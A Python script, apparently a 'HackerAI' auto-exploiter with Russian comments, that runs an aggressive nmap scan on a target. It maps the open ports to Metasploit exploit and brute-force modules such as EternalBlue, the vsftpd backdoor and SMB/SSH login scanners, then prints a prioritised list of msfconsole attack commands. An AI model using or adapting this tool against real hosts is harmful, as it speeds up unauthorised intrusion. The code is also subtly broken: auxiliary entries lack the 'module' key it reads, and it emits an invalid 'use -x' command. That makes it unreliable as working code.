import subprocess
import re
import json
import argparse
import time
from concurrent.futures import ThreadPoolExecutor
import requests
from typing import List, Dict, Set
import xml.etree.ElementTree as ET
import msfrpc
from datetime import datetime

class MetasploitAutoExploiter:
    def __init__(self, target: str, msf_host: str = "127.0.0.1", msf_port: int = 55553, msf_pass: str = "hackerai"):
        self.target = target
        self.msf_host = msf_host
        self.msf_port = msf_port
        self.msf_pass = msf_pass
        
        
        self.msf_client = self.connect_msf()
        
        self.results = {
            'target': target,
            'timestamp': datetime.now().isoformat(),
            'services': {},
            'vulnerabilities': [],
            'exploit_recommendations': [],
            'auto_commands': []
        }
        
        
        self.exploit_db = self.load_exploit_database()

    def connect_msf(self):
        """🔗 Подключение к Metasploit RPC"""
        try:
            client = msfrpc.Msfrpc({'host': self.msf_host, 'port': self.msf_port, 'password': self.msf_pass})
            token = client.login()
            print("✅ Metasploit RPC подключен!")
            return client
        except Exception as e:
            print(f"❌ MSF RPC ошибка: {e}")
            print("🔧 Запустите: msfconsole -x 'load msgrpc Listen 55553 hackerai'")
            return None

    def load_exploit_database(self) -> Dict:
        """📚 Загрузка базы эксплойтов из Exploit-DB + MSF"""
        exploits = {}
        
        
        exploits = {
            21: {  
                'vsftpd_234_backdoor': {'module': 'exploit/unix/ftp/vsftpd_234_backdoor'},
                'proftpd_modcopy': {'module': 'exploit/unix/ftp/proftpd_modcopy_exec'}
            },
            22: {  
                'ssh_userenum': {'aux': 'auxiliary/scanner/ssh/ssh_login'},
                'ssh_bruteforce': {'aux': 'auxiliary/scanner/ssh/ssh_login'}
            },
            23: {  
                'telnet_bruteforce': {'aux': 'auxiliary/scanner/telnet/telnet_login'}
            },
            80: {  
                'shellshock': {'module': 'exploit/multi/http/apache_mod_cgi_bash_env_exec'},
                'struts': {'module': 'exploit/multi/http/struts2_namespace_ognl'},
                'heartbleed': {'module': 'auxiliary/scanner/ssl/openssl_heartbleed'}
            },
            135: {  
                'msrpc': {'aux': 'auxiliary/scanner/dcerpc/endpoint_mapper'}
            },
            139: {  
                'smb_version': {'aux': 'auxiliary/scanner/smb/smb_version'},
                'smb_login': {'aux': 'auxiliary/scanner/smb/smb_login'}
            },
            445: {  
                'eternalblue': {'module': 'exploit/windows/smb/ms17_010_eternalblue'},
                'ms17_010_psexec': {'module': 'exploit/windows/smb/ms17_010_psexec'},
                'smb_bruteforce': {'aux': 'auxiliary/scanner/smb/smb_login'}
            },
            1433: {  
                'mssql_payload': {'module': 'exploit/windows/mssql/mssql_payload'}
            },
            3306: {  
                'mysql_bruteforce': {'aux': 'auxiliary/scanner/mysql/mysql_login'}
            },
            5432: {  
                'postgres_bruteforce': {'aux': 'auxiliary/scanner/postgres/postgres_login'}
            },
            3389: {  
                'rdp_bruteforce': {'aux': 'auxiliary/scanner/rdp/rdp_scanner'}
            },
            6379: {  
                'redis_rce': {'module': 'exploit/linux/redis/redis_module_api'}
            }
        }
        return exploits

    def nmap_advanced_scan(self) -> Dict:
        """🔍 Продвинутый Nmap скан (scripts + versions + vulns)"""
        print(f"🚀 Nmap агрессивный скан: {self.target}")
        
        nmap_cmd = [
            'nmap', '-sC', '-sV', '-sS', '--script=vuln',
            '--script=auth', '--script=default', '-p-', '-T4',
            '--open', '-oX', '-', self.target
        ]
        
        try:
            result = subprocess.run(nmap_cmd, capture_output=True, text=True, timeout=600)
            xml_data = result.stdout
            
            
            root = ET.fromstring(xml_data)
            ports = {}
            
            for port in root.findall('.//port'):
                state = port.find('state')
                if state is not None and state.get('state') == 'open':
                    portid = port.get('portid')
                    service = port.find('.//service')
                    name = service.get('name') if service is not None else 'unknown'
                    version = service.get('version', '') if service is not None else ''
                    
                    
                    cves = []
                    for script in port.findall('.//script'):
                        if 'cve' in script.get('id', '').lower():
                            cves.append(script.get('id'))
                    
                    ports[int(portid)] = {
                        'service': name,
                        'version': version,
                        'cves': cves,
                        'scripts': [script.get('id') for script in port.findall('.//script')]
                    }
            
            self.results['services'] = ports
            print(f"✅ Найдено {len(ports)} открытых портов")
            return ports
            
        except Exception as e:
            print(f"❌ Nmap ошибка: {e}")
            return {}

    def suggest_exploits(self, ports: Dict):
        """💡 Автоматические рекомендации эксплойтов"""
        recommendations = []
        
        for port, service_info in ports.items():
            service_name = service_info['service'].lower()
            
            
            if port in self.exploit_db:
                for vuln_name, exploit_info in self.exploit_db[port].items():
                    recommendation = {
                        'port': port,
                        'service': service_info['service'],
                        'version': service_info['version'],
                        'vulnerability': vuln_name,
                        'module': exploit_info['module'],
                        'type': 'exploit' if 'exploit' in exploit_info.get('module', '') else 'auxiliary',
                        'priority': 'HIGH' if 'eternalblue' in vuln_name or 'backdoor' in vuln_name else 'MEDIUM'
                    }
                    recommendations.append(recommendation)
            
            
            version = service_info['version'].lower()
            if 'vsftpd 2.3.4' in version:
                recommendations.append({
                    'port': port, 'service': 'FTP', 'vulnerability': 'vsftpd_234_backdoor',
                    'module': 'exploit/unix/ftp/vsftpd_234_backdoor', 'priority': 'CRITICAL'
                })
            elif 'ms17-010' in version or 'eternalblue' in ' '.join(service_info.get('cves', [])):
                recommendations.append({
                    'port': port, 'service': 'SMB', 'vulnerability': 'MS17-010 EternalBlue',
                    'module': 'exploit/windows/smb/ms17_010_eternalblue', 'priority': 'CRITICAL'
                })
        
        self.results['exploit_recommendations'] = recommendations
        return recommendations

    def generate_msf_commands(self, recommendations: List[Dict]):
        """🎯 Генерация готовых команд для msfconsole"""
        commands = []
        commands.append(f"use -x 'set RHOSTS {self.target}; set RPORT <PORT>'")
        
        for rec in sorted(recommendations, key=lambda x: x['priority'], reverse=True):
            port = rec['port']
            module = rec['module']
            priority = rec['priority']
            
            cmd_block = f"""
# 🔥 {priority} PRIORITY - {rec['vulnerability']}
use {module}
set RHOSTS {self.target}
set RPORT {port}
show options
# exploit  # <- РУЧНОЙ ЗАПУСК!
"""
            commands.append(cmd_block)
        
        self.results['auto_commands'] = commands
        return commands

    def search_msf_modules(self, service: str):
        """🔍 Поиск модулей в Metasploit по сервису"""
        if not self.msf_client:
            return []
        
        try:
            modules = self.msf_client.modules.search(service.lower())
            return modules
        except:
            return []

    def full_auto_attack(self):
        """🚀 Полный автоматический анализ"""
        print("🔥 HACKERAI AUTO-EXPLOITER INITIATED")
        print("=" * 60)
        
        
        ports = self.nmap_advanced_scan()
        
        
        recommendations = self.suggest_exploits(ports)
        
        
        msf_commands = self.generate_msf_commands(recommendations)
        
        
        self.save_pro_report()
        
        
        self.print_attack_plan(msf_commands)
        
        print("\n✅ ГОТОВЫ К АТАКЕ! Копируйте команды в msfconsole 🚀")

    def save_pro_report(self):
        """💾 Профессиональный отчет"""
        filename = f"msf_auto_{self.target.replace('/', '_').replace(':', '_')}_{int(time.time())}.json"
        with open(filename, 'w') as f:
            json.dump(self.results, f, indent=2)
        print(f"📊 Отчет сохранен: {filename}")

    def print_attack_plan(self, msf_commands: List):
        """🎯 План атаки с приоритетами"""
        print("\n" + "█"*80)
        print("🎯 АТАКУЙТЕ ПО ПРИОРИТЕТУ (копируйте в msfconsole):")
        print("█"*80)
        
        critical = [c for c in self.results['exploit_recommendations'] if c['priority'] == 'CRITICAL']
        high = [c for c in self.results['exploit_recommendations'] if c['priority'] == 'HIGH']
        
        print(f"\n🔴 CRITICAL ({len(critical)}):")
        for rec in critical:
            print(f"  👉 use {rec['module']}")
            print(f"  👉 set RHOSTS {self.target} && set RPORT {rec['port']}")
            print(f"  👉 exploit")
        
        print(f"\n🟡 HIGH ({len(high)}):")
        for rec in high:
            print(f"  👉 use {rec['module']}")
            print(f"  👉 set RHOSTS {self.target} && set RPORT {rec['port']}")
        
        print("\n📋 Полные команды в отчете!")

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="🔥 HackerAI Metasploit Auto-Exploiter")
    parser.add_argument("target", help="IP/Range (192.168.1.1 или 10.0.0.0/24)")
    parser.add_argument("--msf-host", default="127.0.0.1", help="MSF RPC host")
    parser.add_argument("--msf-port", type=int, default=55553, help="MSF RPC port")
    
    args = parser.parse_args()
    
    exploiter = MetasploitAutoExploiter(args.target, args.msf_host, args.msf_port)
    exploiter.full_auto_attack()